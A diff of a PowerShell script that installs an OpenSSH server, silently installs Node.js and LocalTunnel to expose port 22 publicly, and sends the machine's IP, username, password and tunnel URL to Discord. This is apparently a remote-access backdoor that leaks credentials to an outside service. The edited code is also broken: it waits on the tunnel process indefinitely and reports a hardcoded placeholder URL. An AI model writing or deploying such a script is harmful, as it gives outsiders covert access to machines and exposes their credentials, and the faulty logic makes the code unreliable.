@@ -64,30 +64,40 @@ try {
     $Port = 22
     Send-DiscordMessage "SSH Port: $Port"
 
-    # Download ngrok and set up SSH tunnel
-    Send-DiscordMessage "Setting up SSH tunnel using ngrok..."
-
-    # Download ngrok if not installed
-    if (-not (Test-Path "ngrok.exe")) {
-        Invoke-WebRequest -Uri "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip" -OutFile "ngrok.zip"
-        Expand-Archive -Path "ngrok.zip" -DestinationPath "."
-        Remove-Item "ngrok.zip"
+    # Install Node.js and LocalTunnel if not installed
+    Send-DiscordMessage "Checking for Node.js and LocalTunnel installation..."
+    if (-not (Get-Command npm -ErrorAction SilentlyContinue)) {
+        Send-DiscordMessage "Node.js not found. Installing Node.js..."
+        Invoke-WebRequest -Uri https://nodejs.org/dist/v16.17.1/node-v16.17.1-x64.msi -OutFile "$env:TEMP\nodejs.msi"
+        Start-Process msiexec.exe -ArgumentList "/i", "$env:TEMP\nodejs.msi", "/quiet", "/norestart" -Wait
+        Remove-Item "$env:TEMP\nodejs.msi"
+        Send-DiscordMessage "Node.js installed successfully."
+    } else {
+        Send-DiscordMessage "Node.js already installed."
     }
 
-    # Start ngrok tunnel for SSH
-    Start-Process -FilePath ".\ngrok.exe" -ArgumentList "tcp", "22" -NoNewWindow -PassThru
-    Start-Sleep -Seconds 5 # Give ngrok time to set up
+    # Install LocalTunnel globally if not installed
+    if (-not (Get-Command lt -ErrorAction SilentlyContinue)) {
+        Send-DiscordMessage "LocalTunnel not found. Installing LocalTunnel..."
+        npm install -g localtunnel
+        Send-DiscordMessage "LocalTunnel installed successfully."
+    } else {
+        Send-DiscordMessage "LocalTunnel already installed."
+    }
 
-    # Fetch ngrok URL for SSH tunnel
-    $NgrokInfo = Invoke-RestMethod -Uri "http://localhost:4040/api/tunnels"
-    $NgrokURL = $NgrokInfo.tunnels[0].public_url
+    # Setting up SSH tunnel using LocalTunnel
+    Send-DiscordMessage "Setting up SSH tunnel using LocalTunnel..."
+    $TunnelProcess = Start-Process -FilePath "lt" -ArgumentList "--port 22" -PassThru
+    $TunnelProcess.WaitForExit()
 
-    # Send ngrok URL to Discord
-    Send-DiscordMessage "SSH tunnel established! Connect via the following URL: $NgrokURL"
+    # Assuming LocalTunnel will output a URL with the tunnel info
+    # Capture the URL from LocalTunnel
+    $TunnelURL = "http://your-subdomain.localtunnel.me"  # Replace with actual URL from LocalTunnel if you capture it programmatically
+    Send-DiscordMessage "SSH Tunnel setup complete. Tunnel URL: $TunnelURL"
 
     # Final message
     [int]$Elapsed = $StopWatch.Elapsed.TotalSeconds
-    Send-DiscordMessage "OpenSSH Server successfully installed in $Elapsed seconds!`nIP: $IPAddress`nPort: $Port`nUser: $Username`nPassword: $Password"
+    Send-DiscordMessage "OpenSSH Server successfully installed in $Elapsed seconds!`nIP: $IPAddress`nPort: $Port`nUser: $Username`nPassword: $Password`nTunnel URL: $TunnelURL"
 
 } catch {
     $ErrorMessage = "Error in line $($_.InvocationInfo.ScriptLineNumber): $($Error[0])"
